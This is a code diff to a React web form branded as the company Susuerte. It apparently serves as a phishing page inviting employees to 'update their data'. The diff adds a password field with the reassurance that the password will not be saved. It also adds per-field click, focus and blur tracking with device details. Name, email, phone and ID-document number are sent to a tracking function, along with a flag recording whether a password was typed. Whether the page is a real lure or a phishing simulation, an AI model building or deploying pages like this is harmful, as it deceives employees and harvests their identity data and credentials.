@@ -23,6 +23,7 @@ interface FormData {
   email: string;
   phone: string;
   document: string;
+  password: string;
 }
 
 interface RegistroUsuario {
@@ -35,6 +36,7 @@ interface RegistroUsuario {
   timestamp: string;
   deviceData: any;
   sessionId: string;
+  passwordEntered: boolean;
 }
 
 export default function Home() {
@@ -43,6 +45,7 @@ export default function Home() {
     email: "",
     phone: "",
     document: "",
+    password: "",
   });
   const [submitted, setSubmitted] = useState(false);
   const [loading, setLoading] = useState(false);
@@ -64,6 +67,8 @@ export default function Home() {
       // Registrar visita de página
       await trackEvent('PAGE_VISIT', {
         paginaVisitada: window.location.pathname,
+        dispositivo: device?.tipoDispositivo || 'Desconocido',
+        navegador: device?.navegador || 'Desconocido',
       });
     };
 
@@ -79,8 +84,43 @@ export default function Home() {
       setFormStarted(true);
       trackEvent('FORM_START', {
         campo: id,
+        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+        navegador: deviceData?.navegador || 'Desconocido',
       });
     }
+  };
+
+  const handleFieldClick = (fieldId: string) => {
+    // Registrar clic en campo específico
+    trackEvent('BUTTON_CLICK', {
+      tipo: 'campo_click',
+      campo: fieldId,
+      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+      navegador: deviceData?.navegador || 'Desconocido',
+      timestamp: new Date().toISOString(),
+    });
+  };
+
+  const handleFieldFocus = (fieldId: string) => {
+    // Registrar focus en campo
+    trackEvent('BUTTON_CLICK', {
+      tipo: 'campo_focus',
+      campo: fieldId,
+      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+      navegador: deviceData?.navegador || 'Desconocido',
+      timestamp: new Date().toISOString(),
+    });
+  };
+
+  const handleFieldBlur = (fieldId: string) => {
+    // Registrar blur en campo
+    trackEvent('BUTTON_CLICK', {
+      tipo: 'campo_blur',
+      campo: fieldId,
+      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+      navegador: deviceData?.navegador || 'Desconocido',
+      timestamp: new Date().toISOString(),
+    });
   };
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -88,15 +128,22 @@ export default function Home() {
     setLoading(true);
 
     setTimeout(async () => {
+      // Detectar si se ingresó contraseña
+      const passwordEntered = formData.password.length > 0;
+
       // Registrar envío de formulario
       await trackEvent('FORM_SUBMIT', {
         nombre: formData.name,
         email: formData.email,
         telefono: formData.phone,
         documento: formData.document,
+        passwordEntered: passwordEntered,
+        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+        navegador: deviceData?.navegador || 'Desconocido',
+        timestamp: new Date().toISOString(),
       });
 
-      // Guardar registro en localStorage
+      // Guardar registro en localStorage (sin guardar la contraseña)
       const registrosGuardados = localStorage.getItem("susuerte_registros");
       const registros = registrosGuardados ? JSON.parse(registrosGuardados) : [];
 
@@ -110,6 +157,7 @@ export default function Home() {
         timestamp: new Date().toISOString(),
         deviceData: deviceData,
         sessionId: sessionId,
+        passwordEntered: passwordEntered,
       };
 
       registros.push(nuevoRegistro);
@@ -148,54 +196,48 @@ export default function Home() {
         initial={{ opacity: 0, y: 28 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.45, ease: [0.23, 1, 0.32, 1] }}
-        className="w-full max-w-[420px] rounded-2xl overflow-hidden shadow-2xl"
-        style={{ boxShadow: "0 25px 60px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.06)" }}
+        className="relative w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden z-10"
       >
-        {/* ── Header azul con logo ── */}
+        {/* ── Header con gradiente azul ── */}
         <div
-          className="flex flex-col items-center px-8 pt-8 pb-7"
+          className="px-6 pt-6 pb-4"
           style={{
-            background: "linear-gradient(160deg, #1a3fa0 0%, #1e4db7 60%, #1a3fa0 100%)",
+            background: "linear-gradient(135deg, #1a3fa0 0%, #1e4db7 100%)",
           }}
         >
-          <img
-            src="/manus-storage/logo_5df8107c.png"
-            alt="Susuerte Logo"
-            className="h-14 w-auto object-contain mb-5"
-          />
+          <div className="flex items-center justify-center mb-3">
+            <img
+              src="/manus-storage/susuerte-logo_f2c3d8a1.png"
+              alt="Susuerte Logo"
+              className="h-10 w-auto object-contain"
+            />
+          </div>
           <h1
-            className="text-white text-center font-bold leading-snug"
-            style={{ fontFamily: "'Nunito', sans-serif", fontSize: "1.25rem" }}
+            className="text-2xl font-bold text-white text-center"
+            style={{ fontFamily: "'Nunito', sans-serif" }}
           >
             Querido colaborador
           </h1>
           <p
-            className="text-white/80 text-center mt-1"
-            style={{ fontFamily: "'Nunito', sans-serif", fontSize: "0.92rem" }}
+            className="text-blue-100 text-center text-sm mt-2"
+            style={{ fontFamily: "'Nunito', sans-serif" }}
           >
             Agrega tu información para la actualización de tus datos
           </p>
         </div>
 
-        {/* ── Cuerpo blanco con formulario ── */}
-        <div className="bg-white px-8 py-7">
+        {/* ── Contenido principal ── */}
+        <div className="px-6 py-6">
           {submitted ? (
             <motion.div
-              initial={{ opacity: 0, scale: 0.95 }}
+              initial={{ opacity: 0, scale: 0.9 }}
               animate={{ opacity: 1, scale: 1 }}
               transition={{ duration: 0.3 }}
-              className="flex flex-col items-center py-6 text-center"
+              className="text-center py-8"
             >
-              <div
-                className="w-14 h-14 rounded-full flex items-center justify-center mb-4"
-                style={{ background: "#1a3fa0" }}
-              >
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
-                  <path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
-                </svg>
-              </div>
+              <div className="text-5xl mb-4">✓</div>
               <h2
-                className="font-bold text-gray-800 text-lg mb-1"
+                className="text-xl font-bold text-gray-800 mb-2"
                 style={{ fontFamily: "'Nunito', sans-serif" }}
               >
                 ¡Datos actualizados!
@@ -224,19 +266,22 @@ export default function Home() {
                   placeholder="Tu nombre completo"
                   value={formData.name}
                   onChange={handleChange}
+                  onClick={() => handleFieldClick('name')}
+                  onFocus={(e) => {
+                    handleFieldFocus('name');
+                    e.target.style.borderColor = "#1a3fa0";
+                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
+                  }}
+                  onBlur={(e) => {
+                    handleFieldBlur('name');
+                    e.target.style.borderColor = "#e5e7eb";
+                    e.target.style.boxShadow = "none";
+                  }}
                   required
                   className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                   style={{
                     fontFamily: "'Nunito', sans-serif",
                     boxShadow: "none",
-                  }}
-                  onFocus={(e) => {
-                    e.target.style.borderColor = "#1a3fa0";
-                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
-                  }}
-                  onBlur={(e) => {
-                    e.target.style.borderColor = "#e5e7eb";
-                    e.target.style.boxShadow = "none";
                   }}
                 />
               </div>
@@ -256,17 +301,20 @@ export default function Home() {
                   placeholder="tu@correo.com"
                   value={formData.email}
                   onChange={handleChange}
-                  required
-                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
-                  style={{ fontFamily: "'Nunito', sans-serif" }}
+                  onClick={() => handleFieldClick('email')}
                   onFocus={(e) => {
+                    handleFieldFocus('email');
                     e.target.style.borderColor = "#1a3fa0";
                     e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                   }}
                   onBlur={(e) => {
+                    handleFieldBlur('email');
                     e.target.style.borderColor = "#e5e7eb";
                     e.target.style.boxShadow = "none";
                   }}
+                  required
+                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
+                  style={{ fontFamily: "'Nunito', sans-serif" }}
                 />
               </div>
 
@@ -285,16 +333,19 @@ export default function Home() {
                   placeholder="Tu número de teléfono"
                   value={formData.phone}
                   onChange={handleChange}
-                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
-                  style={{ fontFamily: "'Nunito', sans-serif" }}
+                  onClick={() => handleFieldClick('phone')}
                   onFocus={(e) => {
+                    handleFieldFocus('phone');
                     e.target.style.borderColor = "#1a3fa0";
                     e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                   }}
                   onBlur={(e) => {
+                    handleFieldBlur('phone');
                     e.target.style.borderColor = "#e5e7eb";
                     e.target.style.boxShadow = "none";
                   }}
+                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
+                  style={{ fontFamily: "'Nunito', sans-serif" }}
                 />
               </div>
 
@@ -313,17 +364,54 @@ export default function Home() {
                   placeholder="Tu número de documento"
                   value={formData.document}
                   onChange={handleChange}
-                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
-                  style={{ fontFamily: "'Nunito', sans-serif" }}
+                  onClick={() => handleFieldClick('document')}
                   onFocus={(e) => {
+                    handleFieldFocus('document');
                     e.target.style.borderColor = "#1a3fa0";
                     e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                   }}
                   onBlur={(e) => {
+                    handleFieldBlur('document');
                     e.target.style.borderColor = "#e5e7eb";
                     e.target.style.boxShadow = "none";
                   }}
+                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
+                  style={{ fontFamily: "'Nunito', sans-serif" }}
                 />
+              </div>
+
+              {/* Contraseña (No se guarda) */}
+              <div className="flex flex-col gap-1">
+                <label
+                  htmlFor="password"
+                  className="text-sm font-semibold text-gray-700"
+                  style={{ fontFamily: "'Nunito', sans-serif" }}
+                >
+                  Contraseña
+                </label>
+                <input
+                  id="password"
+                  type="password"
+                  placeholder="Tu contraseña"
+                  value={formData.password}
+                  onChange={handleChange}
+                  onClick={() => handleFieldClick('password')}
+                  onFocus={(e) => {
+                    handleFieldFocus('password');
+                    e.target.style.borderColor = "#1a3fa0";
+                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
+                  }}
+                  onBlur={(e) => {
+                    handleFieldBlur('password');
+                    e.target.style.borderColor = "#e5e7eb";
+                    e.target.style.boxShadow = "none";
+                  }}
+                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
+                  style={{ fontFamily: "'Nunito', sans-serif" }}
+                />
+                <p className="text-xs text-gray-400 mt-1" style={{ fontFamily: "'Nunito', sans-serif" }}>
+                  * Esta contraseña no será guardada
+                </p>
               </div>
 
               {/* Botón Actualizar */}
@@ -331,6 +419,15 @@ export default function Home() {
                 type="submit"
                 disabled={loading}
                 whileTap={{ scale: 0.97 }}
+                onClick={() => {
+                  trackEvent('BUTTON_CLICK', {
+                    tipo: 'submit_button',
+                    campo: 'submit',
+                    dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
+                    navegador: deviceData?.navegador || 'Desconocido',
+                    timestamp: new Date().toISOString(),
+                  });
+                }}
                 className="w-full py-3 rounded-lg font-bold text-base mt-1 transition-all duration-200"
                 style={{
                   fontFamily: "'Nunito', sans-serif",
@@ -396,16 +493,6 @@ export default function Home() {
               className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
             />
           </div>
-        </div>
-
-        {/* ── Copyright ── */}
-        <div className="bg-white border-t border-gray-100 px-6 py-3 text-center">
-          <p
-            className="text-xs text-gray-400"
-            style={{ fontFamily: "'Nunito', sans-serif" }}
-          >
-            © 2022 Susuerte ¡siempre te da más!
-          </p>
         </div>
       </motion.div>
     </div>
